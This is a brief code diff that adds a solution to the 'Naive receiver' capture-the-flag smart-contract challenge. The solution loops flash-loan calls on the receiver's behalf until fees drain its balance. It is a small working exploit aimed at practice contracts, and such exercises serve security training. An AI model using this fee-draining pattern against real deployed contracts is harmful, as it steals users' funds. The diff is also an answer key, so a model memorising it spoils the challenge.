@@ -30,7 +30,11 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        const fixedFee = await this.pool.fixedFee();
+        while (await ethers.provider.getBalance(this.receiver.address) >= fixedFee) {
+            await this.pool.flashLoan(this.receiver.address, 0);
+        }
     });
 
     after(async function () {
